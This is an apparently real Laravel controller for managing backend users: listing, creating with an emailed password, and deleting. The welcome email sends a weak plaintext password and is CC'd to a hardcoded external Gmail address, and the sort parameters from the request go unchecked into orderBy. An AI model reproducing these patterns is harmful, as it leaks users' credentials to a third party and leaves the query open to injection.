<?php

namespace App\Http\Controllers\Backend;

use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Hash;
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Role;
use App\User;
Use App\Models\EmailTemplate;
use Mail;
use App\Models\Project;
use Str;

class UsersController extends Controller
{
    public function index(Request $request){
        $sortOrder = (new User)->sortOrder;
        $sortEntity = (new User)->sortEntity;
		
        $view = 'index';
        if(isset($request->sortEntity) and isset($request->sortOrder)) {
            $sortEntity = $request->sortEntity;
            $sortOrder = $request->sortOrder;
            $view = 'pagination';
        }

        $users = User::leftJoin('roles', 'roles.id', '=', 'users.role')->where('users.is_active',"1")
            ->select('users.*', 'roles.name as role_name', 'roles.is_active as role_status')->orderBy($sortEntity, $sortOrder)->get();
        $roles  = Role::where('is_active', 1)->where('name','!=','Super Admin')->pluck('name', 'id')->toArray();
        
        return view('backend.users.'.$view,compact('users','roles', 'sortOrder', 'sortEntity'));
    }

    public function createUserDetail(Request $request) {
        $inputs = $request->all();

        $id = $inputs['id'];
        if($id == null) {
            $user = User::where('email', $inputs['email'])->first();
            if($user != null ) {
                $id = $user['id'];
            }
        }

    	$rules = [
            'name'=>'required|string',
            'role'=>'required|numeric',
			'email' => 'required|string|email|regex:/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix|max:255|unique:users,email,'.$id,
        ];

        $validation = Validator::make($request->all(), $rules);
        if ($validation->fails()) {
            return webResponse(false, 206, $validation->getMessageBag());
        }else {
			$flag = 0;
            if($id != null) {
                $userCreate = User::find($id);
				 if($inputs['id'] == null){
				     	$newPass = Str::random(6);
                    $userCreate->password = Hash::make($newPass);
				 }
				
				
            } else { //$flag = 1;
                $userCreate = new User;
				$newPass = Str::random(6);
                $userCreate->password = Hash::make($newPass);
            }

            $userCreate->name = $inputs['name'];
            $userCreate->email = $inputs['email'];
            $userCreate->role = $inputs['role'];
            $userCreate->is_active = '1';
            $userCreate->save();
            //dd($userCreate);
            if($inputs['id'] == null ) {
                $content = EmailTemplate::find(1);
                $email = $userCreate->email;
                $name = $userCreate->name;
                $subject = $content->template_subject;

                $email_content = str_replace('[RECEIVER NAME]', $name, $content->template_content);
                $email_content = str_replace('[EMAIL]', $email, $email_content);
                $email_content = str_replace('[PASSWORD]',  $newPass, $email_content);
                  $email_content = str_replace('[LINK]', '<a href="'.url('/').'">'.url('/')."</a>", $email_content);

                //$email_content = str_replace('[PASSWORD]', url('about/project/'.$project->id), $email_content);

                $data['test_message'] = $email_content;
                Mail::send('emails.test', $data, function($message) use($email, $name, $subject) {
                    $message->to($email, $name)->cc('tehnodeviser05@gmail.com')->subject($subject);
                });
            }
            return webResponse(true, 200, __('sentence.user_manage.successfully_saved'));
        }
    }


    public function deleteUsersDetail(Request $request, $userId)
    {
        $result = User::where('id', $userId)->pluck('role')->first();
        if($result=="1" || $userId=="2"){
            return false;
        }else{
            
			 $assignedToProjects = Project::where('project_manager', $userId)->first();
			 if($assignedToProjects == null) {
				 User::where('id', $userId)->delete();
			 } else{
				 $res = User::where('id', $userId)->update(['is_active'=> '0', 'job_title'=>null, 'avatar'=>null]);
			 }
			  
             return webResponse(true, 200, __('sentence.user_manage.deleted'));
        }
    }

}
